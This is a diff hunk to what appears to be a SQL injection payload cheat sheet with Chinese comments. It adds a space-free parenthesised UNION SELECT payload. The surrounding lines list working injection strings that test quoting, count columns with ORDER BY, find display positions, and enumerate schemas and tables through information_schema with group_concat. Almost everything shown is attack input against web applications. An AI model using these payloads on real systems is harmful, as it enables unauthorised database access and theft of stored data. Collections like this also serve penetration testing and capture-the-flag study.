@@ -27,6 +27,7 @@ select count(*) from t_info where usename = 'or(1)#\' or nickname = 'or(1)#\'
 -1' and 1=2 -- -
 -1' order by 5 -- - #检测个数
 -1' union select 1,2,3-- - #修改1,2,3,4,5，检测个数
+-1'(union(select(1),(2),(3)))#
 -1' union select 1,database(),3-- - #利用database()判断显示位，可用：version()、user()、current_user()
 -1' union select 1,group_concat(schema_name),3 from information_schema.schemata
 -1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()-- -
